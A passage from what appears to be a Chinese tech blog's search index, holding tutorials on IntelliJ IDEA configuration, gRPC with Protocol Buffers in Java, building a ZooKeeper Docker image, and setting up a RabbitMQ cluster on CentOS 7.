中 Workspace 相当于 IDEA 中的 Project，Eclipse 中 Project 相当于 IDEA 中的 Module。Eclipse 可以在同一个窗口管理 N 个项目，这在 IntelliJ IDEA 是无法做到的。IntelliJ IDEA 提供的解决方案是打开多个项目实例，即打开多个项目窗口，即一个 Project 打开一个 Window 窗口。 IntelliJ IDEA 对版本控制工具的支持 很多人认为 IntelliJ IDEA 自带了 SVN 或者 Git 等版本控制工具，认为只要安装了 IntelliJ IDEA 就可以完全使用版本控制应有的功能。这完全是一种错误的解读，IntelliJ IDEA 是自带对这些版本控制工具的插件支持，但是该装什么版本控制客户端还是要照样装的，这一点和 Eclipse 是一样的。在 Window 环境下，经常使用的 Git 客户端有 msysGit、TortoiseGit 等。IntelliJ IDEA 对版本控制的支持是以插件化的方式来实现的，旗舰版默认支持目前主流的版本控制软件，例如 CVS、Git、Subversion (SVN)、Mercurial、Perforce、GitHub。 IntelliJ IDEA 支持本地文件历史的记录 当项目中没有使用版本控制功能，IntelliJ IDEA 也默认提供了本地文件历史记录。界面操作路径：选中文件 –&gt; Local History –&gt; Show History IntelliJ IDEA 调整 VM 配置文件 根据电脑系统的位数，选择修改 32 位的 VM 配置文件（idea.vmoptions）或者 64 位的 VM 配置文件（idea64.vmoptions） 32 位操作系统内存不会超过 4G，因此没有多大空间可以调整，建议不用调整 64 位操作系统中 8G 内存以下的机子或者是静态页面的开发者，建议不用调整 64 位操作系统且内存大于 8G 的，如果是开发大型项目、Java 项目或者是 Android 项目，建议进行修改，经常修改的就是下面三个参数 如果正在使用 Eclipse / MyEclipse，想通过 IntelliJ IDEA 来解决计算机的卡、慢等问题，这基本上是不可能的，事实上 IntelliJ IDEA 更占用系统资源 1234567891011# 默认配置的内容如下，配置文件所在目录：$idea-root/bin/-Xms128m-Xmx512m-XX:ReservedCodeCacheSize=240m-XX:+UseConcMarkSweepGC-XX:SoftRefLRUPolicyMSPerMB=50# 配置调整的建议-Xms128m，16G内存的机器可尝试设置为 -Xms512m，用于设置初始的内存数，提高该值可以提高Java程序的启动速度-Xmx750m，16G内存的机器可尝试设置为 -Xmx2048m，用于设置最大内存数，提高该值可以减少GC执行的频率，提高程序性能-XX:ReservedCodeCacheSize=240m，16G内存的机器可尝试设置为 -XX:ReservedCodeCacheSize=1024m，用于保留代码占用的内存容量 IntelliJ IDEA 缓存和索引的清理 IntelliJ IDEA 首次加载项目的时候，都会创建索引，而创建索引的时间跟项目的文件多少成正比。在 IntelliJ IDEA 创建索引过程中即使编辑了代码也是编译不了、运行不起来的，只能等 IntelliJ IDEA 创建索引完成。IntelliJ IDEA 的缓存和索引主要是用来加快文件查询，从而加快各种查找、代码提示等操作的速度。但是在某些特殊条件下，IntelliJ IDEA 的缓存和索引文件也是会损坏的，比如：断电、蓝屏引起的强制关机，当重新启动 IntelliJ IDEA，很可能 IntelliJ IDEA 会报各种莫名其妙错误，甚至项目打不开，IntelliJ IDEA 主题还原成默认状态。即使没有断电、蓝屏的情况发生，也会有莫名奇怪的问题的时候，也很有可能是 IntelliJ IDEA 缓存和索引出现了问题，这种情况还不少，遇到此类问题可以尝试清理缓存和索引。 一般建议点击 “Invalidate and Restart”，这样会清理得比较干净。 清除索引和缓存会使得 IntelliJ IDEA 的 Local History 丢失，所以如果项目没有加入到版本控制，而又需要保留项目文件的历史版本记录，那最好备份下 LocalHistory 目录，该目录位置在: ～/.IntelliJIdea14/system/LocalHistory。 通过上面的方式清除缓存与索引，本质也就是去删除 system 目录下对应的文件而已，所以如果不用上述方法也可以先关闭 IntelliJ IDEA，然后直接删除整个 system 目录。当 IntelliJ IDEA 重启的时候，会自动重新创建新的 system 目录以及项目对应的缓存和索引。 IntelliJ IDEA 的 Database 功能 配置 Database 就是为了有一个 GUI 管理数据库功能，但是这并不是 IntelliJ IDEA 的 Database 最重要特性。数据库的 GUI 工具有很多，IntelliJ IDEA 的 Database 也没有太明显的优势。Database 最大的特性就是针对 Java Web 项目经常使用的 ORM 框架，如 Hibernate、Mybatis 有很好的支持，比如配置好了 Database 之后，IntelliJ IDEA 会自动识别 Domain 对象与数据表的关系，也可以通过 Database 的数据表直接生成 Domain 对象等。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"gRPC 基础教程之二",url:"/posts/f534d182.html",text:'SpringBoot 整合 gRPC Gitee Demo 代码 grpc-spring-boot-starter github grpc-spring-boot-starter 中文文档 gRPC 的四种服务类型定义 一个简单 RPC，客户端使用存根发送请求到服务器并等待响应返回，就像平常的函数调用一样。 1rpc GetFeature(Point) returns (Feature) {} 一个服务器端流式 RPC，客户端发送请求到服务器，拿到一个流去读取返回的消息序列。客户端读取返回的流，直到里面没有任何消息。通过在响应类型前插入 stream 关键字，可以指定一个服务器端的流方法。 1rpc ListFeatures(Rectangle) returns (stream Feature) {} 一个 客户端流式 RPC，客户端写入一个消息序列并将其发送到服务器，同样也是使用流。一旦客户端完成写入消息，它等待服务器完成读取返回它的响应。通过在请求类型前指定 stream 关键字来指定一个客户端的流方法。 1rpc RecordRoute(stream Point) returns (RouteSummary) {} 一个双向流式 RPC 是双方使用读写流去发送一个消息序列。两个流独立操作，因此客户端和服务器可以以任意喜欢的顺序读写：比如，服务器可以在写入响应前等待接收所有的客户端消息，或者可以交替地读取和写入消息，或者其他读写的组合，每个流中的消息顺序都会被预留。通过在请求和响应前加 stream 关键字去制定方法的类型。 1rpc RouteChat(stream RouteNote) returns (stream RouteNote) {} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"分布式"},{title:"gRPC 基础教程之一",url:"/posts/ceb4ff2b.html",text:'前言 本文将介绍 gRPC、Protocol Buffers 的概念，同时会给出 Protocol Buffers 代码生成器的使用教程，还有编写第一个基于 gRPC 的服务提供者与服务消费者的示例程序。 相关站点 gRPC Github gRPC 英文文档 gRPC 中文文档 gRPC-Java Github gRPC-Java 示例代码 Protocol Buffers 官网 Protocol Buffers Github Protocol Buffers 英文文档 gRPC 简介 gRPC 是一个高性能、开源和通用的 RPC 框架，面向移动和 HTTP/2 设计。目前提供 C、Java、Go 语言版本，分别是：grpc、grpc-java、grpc-go，其中 C 版本支持 C、C++、Node.js、Python、Ruby、Objective-C、PHP、C#。gRPC 基于 HTTP/2 标准设计，带来诸如双向流、流控、头部压缩、单 TCP 连接上的多复用请求等特性。在 gRPC 里客户端应用可以像调用本地对象一样直接调用另一台不同的机器上服务端应用的方法，更容易地创建分布式应用和服务。与许多 RPC 系统类似，gRPC 也是基于以下理念：定义一个服务，指定其能够被远程调用的方法（包含参数和返回类型）。在服务端实现这个接口，并运行一个 gRPC 服务器来处理客户端调用。在客户端拥有一个存根能够像服务端一样的方法。值得说明的是，gRPC 客户端和服务端可以在多种环境中运行和交互，支持用任何 gRPC 支持的语言来编写，所以可以很容易地用 Java 创建一个 gRPC 服务端，用 Go、Python、Ruby 来创建客户端。 使用 Protocol Buffers gRPC 默认使用 Protocol Buffers，这是 Google 开源的一套成熟的结构数据序列化机制（当然也可以使用其他数据格式如 JSON）。当使用 proto files 创建 gRPC 服务，用 Protocol Buffers 消息类型来定义方法参数和返回类型。尽管 Protocol Buffers 已经存在了一段时间，官方的示例代码种使用了一种名叫 proto3 的新风格的 Protocol Buffers，它拥有轻量简化的语法、一些有用的新功能，并且支持更多新语言。当前针对 Java 和 C++ 发布了 beta 版本，针对 JavaNano（即 Android Java）发布 alpha 版本，在 Protocol Buffers Github 源码库里有 Ruby 支持， 在 Github 源码库里还有针对 Go 语言的生成器， 对更多语言的支持正在开发中。虽然可以使用 proto2 (当前默认的 Protocol Buffers 版本)， 通常建议在 gRPC 里使用 proto3，因为这样可以使用 gRPC 支持全部范围的的语言，并且能避免 proto2 客户端与 proto3 服务端交互时出现的兼容性问题，反之亦然。 本地编译安装 Protocol Buffers（可选） 参考自 gRPC-Java、Protobuf 编译构建的官方教程，一般情况下不需要构建 gRPC-Java，只有在对 gRPC-Java 的源码进行了更改或测试使用 gRPC-Java 库的非发布版本（例如 master 分支）时才需要构建。若本地安装了 Protobuf，则可以直接通过命令的方式调用 Protobuf 的代码生成器，无需再依赖额外的 IDE 插件。 1234567891011121314151617181920212223242526272829303132333435363738# 系统环境CentOS Linux release 7.6.1810 (Core)Linux develop 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux# 拉取源码# git clone https://github.com/google/protobuf.git# 进入源码目录# cd protobuf# 切换至需要编译的版本的分支# git checkout v3.7.1# 查看当前所在的分支信息# git branch -v# 检测安装环境# ./autogen.sh# ./configure --disable-shared# 编译安装# make -j 8# make install# 如果/usr/local/lib不在库搜索路径中，可以通过运行以下命令添加# sh -c \'echo /usr/local/lib &gt;&gt; /etc/ld.so.conf\'# 使添加的库搜索路径生效# ldconfig# 查看protobuf安装的版本号# protoc --version# 编写.proto文件，使用protobuf的代码生成器自动生成Java代码，命令格式如下# protoc -I=$SRC_DIR --java_out=$DST_DIR $SRC_DIR/addressbook.proto# 默认安装路径：/usr/local# 指定安装目录可以使用此命令： ./configure --disable-shared --prefix=/usr/local/protobuf-3.7.1 Eclipse 项目中添加 Protobuf 自动生成代码的 Maven 插件与 Protobuf 依赖 Protobuf 的原型文件和一些适合的插件，默认放在 src/main/proto 和 src/test/proto 目录中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;dependency&gt; &lt;groupId&gt;io.grpc&lt;/groupId&gt; &lt;artifactId&gt;grpc-netty-shaded&lt;/artifactId&gt; &lt;version&gt;1.21.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.grpc&lt;/groupId&gt; &lt;artifactId&gt;grpc-protobuf&lt;/artifactId&gt; &lt;version&gt;1.21.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.grpc&lt;/groupId&gt; &lt;artifactId&gt;grpc-stub&lt;/artifactId&gt; &lt;version&gt;1.21.0&lt;/version&gt;&lt;/dependency&gt;&lt;build&gt; &lt;extensions&gt; &lt;extension&gt; &lt;groupId&gt;kr.motd.maven&lt;/groupId&gt; &lt;artifactId&gt;os-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.5.0.Final&lt;/version&gt; &lt;/extension&gt; &lt;/extensions&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.xolstice.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;protobuf-maven-plugin&lt;/artifactId&gt; &lt;version&gt;0.5.1&lt;/version&gt; &lt;configuration&gt; &lt;protocArtifact&gt;com.google.protobuf:protoc:3.7.1:exe:${os.detected.classifier}&lt;/protocArtifact&gt; &lt;pluginId&gt;grpc-java&lt;/pluginId&gt; &lt;pluginArtifact&gt;io.grpc:protoc-gen-grpc-java:1.21.0:exe:${os.detected.classifier}&lt;/pluginArtifact&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;compile&lt;/goal&gt; &lt;goal&gt;compile-custom&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 往 Gradle 构建的项目添加 Protobuf 自动生成代码的插件与 Protobuf 依赖 1234567891011121314151617181920212223242526plugins { id \'com.google.protobuf\' version \'0.8.8\'}protobuf { protoc { artifact = "com.google.protobuf:protoc:3.7.1" } plugins { grpc { artifact = \'io.grpc:protoc-gen-grpc-java:1.21.0\' } } generateProtoTasks { all()*.plugins { grpc {} } }}dependencies { compile \'io.grpc:grpc-stub:1.21.0\' compile \'io.grpc:grpc-protobuf:1.21.0\' compile \'io.grpc:grpc-netty-shaded:1.21.0\' testCompile group: \'junit\', name: \'junit\', version: \'4.12\'} 编写 Proto 文件（定义服务），执行编译后自动生成 Java 文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465# 创建gradle工程grpc-demo-provider，目录结构如下：grpc-demo-provider/├── build.gradle└── src ├── main │&nbsp;&nbsp; ├── java │&nbsp;&nbsp; ├── proto │&nbsp;&nbsp; │&nbsp;&nbsp; └── helloworld.proto │&nbsp;&nbsp; └── resources └── test ├── java ├── proto └── resources# 进入工程目录# cd grpc-demo-provider# 编辑build.gradle文件，添加protobuf插件与依赖，可参考上面给出的gradle配置内容# 创建proto文件# mkdir -p src/main/proto# vim src/main/proto/helloworld.protosyntax = "proto3";option java_multiple_files = true;option java_package = "com.grpc.demo.generate";option java_outer_classname = "HelloWorldProto";option objc_class_prefix = "HLW";package helloworld;service Greeter { rpc SayHello (HelloRequest) returns (HelloReply) {}}message HelloRequest { string name = 1;}message HelloReply { string message = 1;}# 执行编译，自动生成Java文件# gradle clean build# 查看自动生成的文件目录结构，默认生成文件所在的目录是：$buildDir/generated/source/proto，其中Message在main/java目录下，Service在目录main/grpc下# tree build/generated/source/protomain├── grpc│&nbsp;&nbsp; └── com│&nbsp;&nbsp; └── grpc│&nbsp;&nbsp; └── demo│&nbsp;&nbsp; └── generate│&nbsp;&nbsp; └── GreeterGrpc.java└── java └── com └── grpc └── demo └── generate ├── HelloReply.java ├── HelloReplyOrBuilder.java ├── HelloRequest.java ├── HelloRequestOrBuilder.java └── HelloWorldProto.java Gradle 指定 Protobuf 代码自动生成的目录位置 1234567891011121314151617181920212223242526272829303132333435// 指定Message代码的生成位置，最终生成位置在src/main/java目录下protobuf { generatedFilesBaseDir = "src"}// 指定Service代码的生成位置，最终生成位置在src/main/java目录下protobuf { generateProtoTasks { all()*.plugins { grpc { outputSubDir = \'java\' } } }}// 完整的写法，同时指定Message、Service代码生成的目录位置为src/main/javaprotobuf { protoc { artifact = "com.google.protobuf:protoc:3.7.1" } plugins { grpc { artifact = \'io.grpc:protoc-gen-grpc-java:1.21.0\' } } generateProtoTasks { all()*.plugins { grpc { outputSubDir = \'java\' } } } generatedFilesBaseDir = \'src\'} RPC 服务提供者的实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566package com.grpc.demo.provider.service;import com.grpc.demo.generate.GreeterGrpc;import com.grpc.demo.generate.HelloReply;import com.grpc.demo.generate.HelloRequest;import io.grpc.Server;import io.grpc.ServerBuilder;import io.grpc.stub.StreamObserver;import java.io.IOException;import java.util.logging.Logger;public class HelloWorldProvider { private Server server; private static final Logger logger = Logger.getLogger(HelloWorldProvider.class.getName()); private void start() throws IOException { int port = 50051; server = ServerBuilder.forPort(port) .addService(new GreeterImpl()) .build() .start(); logger.info("==&gt; Server started, listening on " + port); Runtime.getRuntime().addShutdownHook(new Thread() { @Override public void run() { System.err.println("*** shutting down gRPC server since JVM is shutting down"); HelloWorldProvider.this.stop(); System.err.println("*** server shut down"); } }); } private void stop() { if (server != null) { server.shutdown(); } } /** * Await termination on the main thread since the grpc library uses daemon threads. */ private void blockUntilShutdown() throws InterruptedException { if (server != null) { server.awaitTermination(); } } public static void main(String[] args) throws IOException, InterruptedException { final HelloWorldProvider server = new HelloWorldProvider(); server.start(); server.blockUntilShutdown(); } static class GreeterImpl extends GreeterGrpc.GreeterImplBase { @Override public void sayHello(HelloRequest req, StreamObserver&lt;HelloReply&gt; responseObserver) { HelloReply reply = HelloReply.newBuilder().setMessage("Hello " + req.getName()).build(); responseObserver.onNext(reply); responseObserver.onCompleted(); } }} RPC 服务消费者的实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package com.grpc.demo.consumer.service;import com.grpc.demo.generate.GreeterGrpc;import com.grpc.demo.generate.HelloReply;import com.grpc.demo.generate.HelloRequest;import io.grpc.ManagedChannel;import io.grpc.ManagedChannelBuilder;import io.grpc.StatusRuntimeException;import java.util.concurrent.TimeUnit;import java.util.logging.Level;import java.util.logging.Logger;public class HelloWorldConsumer { private final ManagedChannel channel; private final GreeterGrpc.GreeterBlockingStub blockingStub; private static final Logger logger = Logger.getLogger(HelloWorldConsumer.class.getName()); public HelloWorldConsumer(String host, int port) { this(ManagedChannelBuilder.forAddress(host, port) .usePlaintext() .build()); } HelloWorldConsumer(ManagedChannel channel) { this.channel = channel; blockingStub = GreeterGrpc.newBlockingStub(channel); } public void shutdown() throws InterruptedException { channel.shutdown().awaitTermination(5, TimeUnit.SECONDS); } public void greet(String name) { logger.info("==&gt; Will try to greet " + name + " ..."); HelloRequest request = HelloRequest.newBuilder().setName(name).build(); HelloReply response; try { response = blockingStub.sayHello(request); } catch (StatusRuntimeException e) { logger.log(Level.WARNING, "RPC failed: {0}", e.getStatus()); return; } logger.info("==&gt; Greeting: " + response.getMessage()); } public static void main(String[] args) throws Exception { HelloWorldConsumer client = new HelloWorldConsumer("localhost", 50051); try { String user = "World"; client.greet(user); } finally { client.shutdown(); } }} 先后启动 Provider、Consumer 应用，最终输出的日志信息如下图所示 Provider 应用的日志信息： Consumer 应用的日志信息： var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"分布式"},{title:"编写 DockerFile 构建 ZooKeeper 镜像",url:"/posts/b683a4df.html",text:'下载所需版本的软件安装包 12├── jdk-8u201-linux-x64.tar.gz└── apache-zookeeper-3.5.5.tar.gz 编写 DockerFile 文件 123456789101112131415161718192021222324252627282930FROM centosMAINTAINER peter&lt;peter@gmail.com&gt;ADD jdk-8u201-linux-x64.tar.gz /usr/localADD apache-zookeeper-3.5.5.tar.gz /usr/localRUN yum -y updateRUN yum -y install vim net-tools telnet tree git wget curlENV work_path /usr/localWORKDIR $work_path# JDKENV JAVA_HOME /usr/local/jdk1.8.0_201ENV JRE_HOME /usr/local/jdk1.8.0_201/jreENV CLASSPATH .:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib# ZooKeeperENV ZOOKEEPER_HOME /usr/local/apache-zookeeper-3.5.5# PATHENV PATH $PATH:$JAVA_HOME/bin:$JRE_HOME/bin:$ZOOKEEPER_HOME/binRUN cp $ZOOKEEPER_HOME/conf/zoo_sample.cfg $ZOOKEEPER_HOME/conf/zoo.cfgEXPOSE 2181CMD $ZOOKEEPER_HOME/bin/zkServer.sh start-foreground 构建 ZooKeeper 镜像，创建并启动 ZooKeeper 容器 12345# 构建镜像# docker build -f docker-file -t zookeeper:3.5.5 .# 创建并启动容器# docker run -d --name zookeeper -p 2181:2181 zookeeper:3.5.5 测试客户端连接 ZooKeeper 服务器端 123456789101112131415161718192021222324252627282930313233# 连接ZooKeeper容器# docker exec -it zookeeper /bin/bash# 进入ZooKeeper的bin目录# cd apache-zookeeper-3.5.5/bin# 客户端连接ZooKeeper服务器端$ ./zkCli.sh -server 127.0.0.1:2181# 创建节点[zk: 127.0.0.1:2181(CONNECTED) 1] create -e /test-node 123456# 列出所有根节点[zk: 127.0.0.1:2181(CONNECTED) 2] ls /[test-node, zookeeper]# 获取指定节点的值[zk: 127.0.0.1:2181(CONNECTED) 3] get /test-node123456cZxid = 0x4ctime = Fri Feb 22 02:27:43 UTC 2019mZxid = 0x4mtime = Fri Feb 22 02:27:43 UTC 2019pZxid = 0x4cversion = 0dataVersion = 0aclVersion = 0ephemeralOwner = 0x1000a766c5e0001dataLength = 6numChildren = 0# 断开客户端连接[zk: 127.0.0.1:2181(CONNECTED) 4] quit var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Centos7 搭建 RabbitMQ 集群（超详细）",url:"/posts/486aeff3.html",text:'前言集群模式RabbitMQ 是用 Erang 开发的，集群模式分为两种普通模式 和镜像模式，可以说镜像模式是普通模式的升级版，其中 RabbitMQ 默认使用的是 普通模式。 普通模式：以两个节点（rabbit01、rabbit02）为例来进行说明，rabbit01 和 rabbit02 两个节点仅有相同的元数据，即队列的结构，但消息实体只存在于其中一个节点 rabbit01（或者 rabbit02）中。当消息进入 rabbit01 节点的 Queue 后，consumer 从 rabbit02 节点消费时，RabbitMQ 会临时在 rabbit01、rabbit02 间进行消息传输，把 A 中的消息实体取出并经过 B 发送给 consumer。所以 consumer 应尽量连接每一个节点，从中取消息。即对于同一个逻辑队列，要在多个节点建立物理 Queue。否则无论 consumer 连 rabbit01 或 rabbit02，出口总在 rabbit01，会产生瓶颈。当 rabbit01 节点故障后，rabbit02 节点无法取到 rabbit01 节点中还未消费的消息实体。如果做了消息持久化，那么得等 rabbit01 节点恢复，然后才可被消费；如果没有持久化的话，就会产生消息丢失的现象。 镜像模式：在普通模式的基础上，把需要的队列做成镜像队列，存在于多个节点，消息实体会主动在镜像节点间同步，而不是在客户端取数据时临时拉取，也就是说多少节点消息就会备份多少份。该模式带来的副作用也很明显，除了降低系统性能外，如果镜像队列数量过多，加之大量的消息进入，集群内部的网络带宽将会被这种同步通讯大大消耗掉，所以在对业务可靠性要求较高的场合中适用。由于镜像队列之间消息自动同步，且内部有选举 Master 机制，即使 Master 节点宕机也不会影响整个集群的使用，达到去中心化的目的，从而有效的防止消息丢失及服务不可用等问题 集群节点的区别RabbitMQ 的集群节点分为磁盘节点、内存节点。RabbitMQ 支持消息的持久化，也就是数据写在磁盘上。在 RabbitMQ 集群中，必须至少有一个磁盘节点，否则队列元数据无法写入到集群中。当磁盘节点宕掉时，集群将无法写入新的队列元数据信息。如果 RabbitMQ 集群全部宕机，必须先启动磁盘节点，然后再启动内存节点。最合适的方案就是既有磁盘节点，又有内存节点，推荐 1 个 磁盘节点 + 2 个内存节点的集群搭建方式。 准备工作集群规划 名称 IP 端口 用途 RabbitMQ 节点名称 节点一 192.168.1.109 15672 磁盘节点 rabbit@rabbitmq1 节点二 192.168.1.201 15672 内存节点 rabbit@rabbitmq2 节点三 192.168.1.200 15672 内存节点 rabbit@rabbitmq3 注意，在生产环境搭建 RabbitMQ 集群时，所有集群节点要求都可以连接上互联网，另外 RabbitMQ 集群节点建议都在同一网段里，如果是跨广域网（外网），效果会变差。 系统初始化 更改系统的最大打开文件描述符数 创建用户和用户组12345# 创建rabbitmq用户组# groupadd rabbitmq# 创建rabbitmq用户（不允许远程登录）# useradd -g rabbitmq rabbitmq -s /bin/false RabbitMQ 集群安装Erlang 安装在每个集群节点上分别编译安装 Erlang，这里使用的版本是 23.2，其他版本的 Erlang 可以从 Erlang 官网 下载 1234567891011121314151617181920212223242526272829303132# 安装依赖# yum install -y make autoconf gcc gcc-c++ glibc-devel kernel-devel m4 ncurses-devel openssl-devel unixODBC unixODBC-devel libtool libtool-ltdl-devel unzip# 创建安装目录# mkdir -p /usr/local/erlang-23.2# 下载# wget https://erlang.org/download/otp_src_23.2.tar.gz# 解压# tar -xvf otp_src_23.2.tar.gz# 进入解压目录# cd otp_src_23.2# 配置# ./otp_build autoconf# ./configure --prefix=/usr/local/erlang-23.2 --without-javac# 编译安装# make &amp;&amp; make install# 创建软链接# ln -sf /usr/local/erlang-23.2/bin/erl /usr/bin/erl# 配置环境变量# vim /etc/profileexport ERLANG_HOME=/usr/local/erlang-23.2export PATH=$PATH:$ERLANG_HOME/bin# 使环境变量生效# source /etc/profile RabbitMQ 安装在每个集群节点上分别使用二进制包的方式安装 RabbitMQ，使用的版本是 3.8.6，其他版本的 RabbitMQ 可以从 RabbitMQ Github 下载 123456789101112131415# 安装依赖# yum install -y xmlto python-simplejson# 下载# wget https://github.com/rabbitmq/rabbitmq-server/releases/download/v3.8.6/rabbitmq-server-generic-unix-3.8.6.tar.xz# 解压# xz -d rabbitmq-server-generic-unix-3.8.6.tar.xz# tar -xvf rabbitmq-server-generic-unix-3.8.6.tar# 拷贝安装文件# cp -r rabbitmq_server-3.8.6 /usr/local/rabbitmq# 文件授权# chown -R rabbitmq:rabbitmq /usr/local/rabbitmq RabbitMQ 配置在每个集群节点上分别配置 RabbitMQ，包括创建默认的日志目录与数据目录、启用 Web 控制台管理插件 123456789101112131415161718192021# 创建默认的日志目录与数据目录# mkdir -p /usr/local/rabbitmq/var/log/rabbitmq# mkdir -p /usr/local/rabbitmq/var/lib/rabbitmq/mnesia# 创建默认的配置文件# touch /usr/local/rabbitmq/etc/rabbitmq/rabbitmq.config# echo "[]." &gt; /usr/local/rabbitmq/etc/rabbitmq/rabbitmq.config# 创建默认的环境变量文件# touch /usr/local/rabbitmq/etc/rabbitmq/rabbitmq-env.conf# echo "CONF_ENV_FILE=/usr/local/rabbitmq/etc/rabbitmq/rabbitmq-env.conf" &gt;&gt; /usr/local/rabbitmq/sbin/rabbitmq-defaults# 启用Web控制台管理插件# cd /usr/local/rabbitmq/sbin# ./rabbitmq-plugins enable rabbitmq_management# 查看所有插件的安装信息# ./rabbitmq-plugins list# 文件授权# chown -R rabbitmq:rabbitmq /usr/local/rabbitmq 在每个集群节点上分别配置 RabbitMQ，包括创建虚拟主机、超级管理员用户、设置角色权限。由于出于系统安全考虑，RabbitMQ 默认限制了 guest 用户只能通过 localhost 登录使用，因此需要手动创建管理员帐号，并更改 guest 用户默认的密码 1234567891011121314151617181920212223242526# 进入安装目录# cd /usr/local/rabbitmq/sbin# 前台启动RabbitMQ服务（默认会打印出日志文件和配置文件的路径）# ./rabbitmq-server# 或者后台启动RabbitMQ服务# ./rabbitmq-server -detached# 创建虚拟主机（相当于MySQL的数据库概念）# ./rabbitmqctl add_vhost /# 更改guest用户默认的密码# ./rabbitmqctl change_password guest yourPassword# 创建超级管理员用户# ./rabbitmqctl add_user admin yourPassword# 赋予administrator角色给超级管理员用户# ./rabbitmqctl set_user_tags admin administrator# 赋予超级管理员用户权限# ./rabbitmqctl set_permissions -p / admin \'.*\' \'.*\' \'.*\'# 彻底关闭后台启动的RabbitMQ服务# ./rabbitmqctl stop RabbitMQ 普通集群搭建添加节点主机名在每个集群节点上分别编辑 /etc/hosts 配置文件，指定各个节点的主机名 1234# vim /etc/hosts192.168.1.109 rabbitmq1192.168.1.201 rabbitmq2192.168.1.200 rabbitmq3 配置节点的名称RabbitMQ 节点由节点名称（RABBITMQ_NODENAME）标识，节点名称由两部分组成，前缀（默认是 rabbit）和主机名，例如：rabbit@rabbit1 是一个包含前缀 rabbit 和主机名 rabbit1 的节点名称。可以在同一台主机上运行多个 RabbitMQ 节点，但集群中每个节点必须有一个唯一的 RABBITMQ_NODENAME。若在同一台主机上运行多个节点（开发和 QA 环境中通常是这种情况），每个节点还必须使用不同的前缀，例如：rabbit1@hostname1 和 rabbit2@hostname2。在集群中，节点使用节点名称标识和联系彼此，这意味着必须解析每个节点名的主机名部分。当节点启动时，它会检查是否已为其分配了节点名，这是通过配置文件 rabbitmq-env.conf 里的 RABBITMQ_NODENAME 环境变量指定，如果环境变量没有配置，则节点将解析其主机名并在其前面添加 rabbit 来计算其节点名。 在每个集群节点上分别配置节点名称，只需将下面 rabbit@xxx 中的 xxx 替换为该节点的主机名即可，例如节点一的节点名称为： rabbit@rabbitmq1 12# 配置节点名称# echo "NODENAME=rabbit@xxx" &gt;&gt; /usr/local/rabbitmq/etc/rabbitmq/rabbitmq-env.conf 拷贝 Erlang CookieRabbitMQ 的集群是依附于 Erlang 的集群来工作的，所以必须先构建起 Erlang 的集群。Erlang 的集群中各节点是经由过程一个 cookie 来实现的，当使用解压缩的方式来安装 RabbitMQ 时，那么这个 cookie 存放在 ${home}/.erlang.cookie 中，文件是 400 的权限。必须保证集群各节点的 cookie 一致，不然节点之间就无法通信。 123# 拷贝节点一的Cookie到其他节点# scp /root/.erlang.cookie root@rabbitmq2:/root/# scp /root/.erlang.cookie root@rabbitmq3:/root/ 构建集群节点在每个集群节点上分别启动 RabbitMQ 的服务，这里默认使用的用户为 root。当使用解压缩的方式来安装 RabbitMQ 时，cookie 是存放在 ${home}/.erlang.cookie，因此这里必须注意各个节点的 RabbitMQ 是使用哪个用户启动，否则后续很可能由于各节点的 .erlang.cookie 不一致而导致节点无法加入集群。 12345# 进入安装目录# cd /usr/local/rabbitmq/sbin# 后台启动RabbitMQ服务# 